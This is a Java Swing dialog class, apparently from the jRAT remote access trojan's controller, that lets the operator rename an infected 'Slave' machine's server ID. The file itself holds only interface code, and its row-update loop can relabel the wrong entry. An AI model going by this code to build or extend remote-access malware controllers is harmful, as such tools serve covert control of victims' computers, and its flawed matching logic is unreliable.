package pro.jrat.ui.frames;

import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTextField;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.border.EmptyBorder;

import pro.jrat.Slave;
import pro.jrat.settings.ServerID;
import pro.jrat.utils.Utils;


@SuppressWarnings("serial")
public class FrameRename extends BaseFrame {

	private JPanel contentPane;
	private JTextField txtOldID;
	private JTextField txtNewID;
	public Slave slave;
	private JButton btnRename;

	public FrameRename(Slave slave) {
		super();
		this.slave = slave;
		final Slave sl = slave;
		setTitle("Rename server - " + slave.getIP());
		setResizable(false);
		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameRename.class.getResource("/icons/rename.png")));
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 293, 126);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);

		JLabel lblOldId = new JLabel("Old ID:");

		txtOldID = new JTextField(slave.getServerID());
		txtOldID.setEditable(false);
		txtOldID.setColumns(10);

		JLabel lblNewId = new JLabel("New ID:");

		txtNewID = new JTextField();
		txtNewID.setColumns(10);

		btnRename = new JButton("Rename");
		btnRename.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				ServerID.getGlobal().add(txtNewID.getText(), sl.getServerID(), sl.getRawIP());
				for (int i = 0; i < Frame.mainModel.getRowCount(); i++) {
					Slave sla = Utils.getSlave(Frame.mainModel.getValueAt(i, 3).toString());
					if (sla != null) {
						Frame.mainModel.setValueAt(txtNewID.getText(), i, 1);
						break;
					}
				}
				setVisible(false);
				dispose();
			}
		});
		GroupLayout gl_contentPane = new GroupLayout(contentPane);
		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addGap(4).addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING).addComponent(btnRename).addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addGap(10).addComponent(lblOldId).addGap(4).addComponent(txtOldID, GroupLayout.PREFERRED_SIZE, 217, GroupLayout.PREFERRED_SIZE)).addGroup(gl_contentPane.createSequentialGroup().addGap(4).addComponent(lblNewId).addGap(5).addComponent(txtNewID, GroupLayout.PREFERRED_SIZE, 217, GroupLayout.PREFERRED_SIZE)))).addContainerGap(12, Short.MAX_VALUE)));
		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addGap(11).addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addGap(3).addComponent(lblOldId)).addComponent(txtOldID, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)).addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addGap(9).addComponent(lblNewId)).addGroup(gl_contentPane.createSequentialGroup().addGap(5).addComponent(txtNewID, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))).addPreferredGap(ComponentPlacement.RELATED, 9, Short.MAX_VALUE).addComponent(btnRename)));
		contentPane.setLayout(gl_contentPane);
	}
}
